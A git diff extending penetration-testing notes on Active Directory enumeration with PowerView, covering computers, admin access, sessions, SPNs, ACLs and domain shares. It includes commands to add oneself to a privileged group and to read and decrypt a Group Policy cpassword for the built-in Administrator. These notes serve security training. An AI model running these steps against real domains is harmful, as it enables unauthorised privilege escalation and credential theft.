@@ -8,7 +8,13 @@
 ### Manual Enumeration
 
 - start with users and groups
+- then OS
+- Permissions and loggon on users
+- Service Principal names
+- Object permissions
+- Domain Shares
 
+`CREATE A DOMAIN MAP WHILE ENUMERATING - VISUALIZING HELPS TO FIND ATTACK VECTORS`
 
 #### Legacy Windows Tools (net.exe)
 ##### Users
@@ -244,6 +250,9 @@ Groups can be members of groups (Nested groups). This means members in encapsula
 
 PowerView is a PowerShell script for interacting with and enumerating AD.
 
+#### Groups and Users
+
+
 To start using PowerView:
 ```
 Import-Module .\PowerView.ps1
@@ -288,5 +297,189 @@ Get-NetGroup | select member
 To enumerate groups of a group:
 ```
 Get-NetGroup | select group
+```
+
+
+#### Operating System
+
+Enumerate computer objects in the domain:
+```
+Get-NetComputer | select operatingsystem,dnshostname
+```
+
+This command can be used to gain a lot of information, but the above filtering will be easier to view what computers are on the system and their hostname which may reveal their role within the domain.
+
+
+#### Permissions and Logged on Users
+
+Enumerate if we have any administrative access to machines on the domain:
+```
+Find-LocalAdminAccess
+```
+
+This command relies on the `OpenServiceW` function. It connects to the `Service Control Manager `(SCM) on target machines. SCM maintains a database of installed services and drives on Windows Computers. This command attempts to open this database with the `SC_MANAGER_ALL_ACCESS` right (which requires admin privs). If the connection is successful it is assumed we have administrative access to that machine. 
+
+Enumerate current logged in users on a machine:
+```
+Get-NetSession -ComputerName <hostname> -Verbose
+```
+
+This command makes use of NetWkstaUserEnum and NetSessionEnum functions form the winapi.
+They're the most reliable but may not work a lot of the time, as one of these requires admin privs and the other doesn't. In recent Windows Versions it also wont be able to access the necessary registry hive to gather this information. `So this is mainly useful for older versions of windows`. It relies on the `SrvsvcSessionInfo` located `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity`
+
+We can instead use PSLoggedon.exe:
+```
+.\PsLoggedOn.exe \\hostname
+```
+
+This enumerates registry keys under HKEY_USERS to retrieve SIDs and map them to usernames, It also uses the NetSessionEnum winapi function, but relies on the `Remote Registry` service.
+
+`If we find we have administrative access to a computer - and through the above commands reveal there is another user logged in on the system - we may be able to steal their crednetials as their credentials would be cached on the system`
+
+
+#### Enumerating Service Principal Names (Service Accounts)
+
+Service accounts while may not have Admin Privs, may have higher privs than usual or are members of higher prived groups.
+
+Services launched by the system itself run in the context of a `Service Account`:
+- LocalSystem
+- LocalService
+- NetworkService
+
+More complex applications may use a domain user for the needed context while still maintaining access to resources inside the domain.
+
+When applications MSSQL are integrated into AD, a unique service instance known as a `Service Principal Name (SPN)` associates a service to a specific service account in AD.
+
+There is also the introduction of `Managed Service Accounts` the handle this. Which on or the other may be in use depending on the server/windows version.
+
+Enumerate SPNs in the domain:
+```
+setspn -L iis_service
+```
+
+This command will search for all clients/servers in the domain for the presence of the iis_service (which is a user we found) SPN.
+
+We can also enumerate for an SPN is to use:
+```
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+```
+
+This command will enumerate all users on the domain to obtain a clear list of SPNs.
+
+`if we find a location like a webdomain to checkout in the results we can use nslookup to find the ip`
+
+```
+nslookup.exe <domain>
+```
+
+
+#### Enumerating Object Permissions
+
+An AD object may have a set of permissions applied to it with multiple `Access Control Entries (ACE)`. These ACEs make up the ACL. Each ACE defines whether access to the specific object is allowed.
+
+When a user tries to access and object in AD a check will be made against the ACL to see if a there's an ACE that allows the user to access the object. To do this, as part of the process of accessing an object he user must send an `access token` which contains the users identity and permissions.
+
+The most interesting permissions we're interested in include:
+```
+GenericAll: Full permissions on object
+GenericWrite: Edit certain attributes on the object
+WriteOwner: Change ownership of the object
+WriteDACL: Edit ACE's applied to object
+AllExtendedRights: Change password, reset password, etc.
+ForceChangePassword: Password change for object
+Self (Self-Membership): Add ourselves to for example a group
+```
+
+To enumerate ACEs of a user with `PowerView.ps1` we can use:
+```
+Get-ObjectAcl -Identity stephanie
+```
+
+This will print our every single ACE applied to the Stephanie user. This is how we do it for every object (group, user, etc)
+
+The properties we are mainly interested from this output include:
+- ObjectSID
+- ActiveDirectoryRights
+- SecurityIdentifier
+
+To decipher SIDs we gather from this output we can use powerview:
+```
+Convert-SidToName <SID>
+```
+
+To further enumerate all objects in we could do something like:
+```
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+```
+
+This command would print all the ACEs that have the `GenericAll` privilege which is the highest.
+
+We could then convert all the SIDs to names we find like so:
+```
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+```
+
+If we found we had permissions to a powerful group and we can our selves, we could use this:
+```
+net group "Management Department" stephanie /add /domain
+```
+
+
+#### Enumerating Domain Shares
+
+Domain shared often contain critical information about the environment.
+
+We can list all domain shares using powerview:
+```
+Find-DomainShare
+```
+
+This will show us shares available to us:
+```
+Find-DomainShare -CheckShareAccess
+```
+
+`We should search each share we come across in search for valuable information.`
+
+`SYSVOL` is a particularly valuable share to check as it may include folders and files that reside on the domain controller itself. It is typically used for various domain policies and scripts. 
+By default, the **SYSVOL** folder is mapped to `**%SystemRoot%\SYSVOL\Sysvol\domain-name**` on the domain controller and every domain user has access to it.
+
+```
+ls \\dc1.corp.com\sysvol\corp.com\
+```
+
+```
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+```
+
+If we find an encrypted password we may be able to decrypt it with `gpp-decrypt`:
+
+```
+PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+          name="Administrator (built-in)"
+          image="2"
+          changed="2012-05-03 11:45:20"
+          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
+    <Properties
+          action="U"
+          newName=""
+          fullName="admin"
+          description="Change local admin"
+          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+          changeLogon="0"
+          noChange="0"
+          neverExpires="0"
+          acctDisabled="0"
+          userName="Administrator (built-in)"
+          expires="2016-02-10" />
+  </User>
+</Groups>
+```
+
+```
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
 
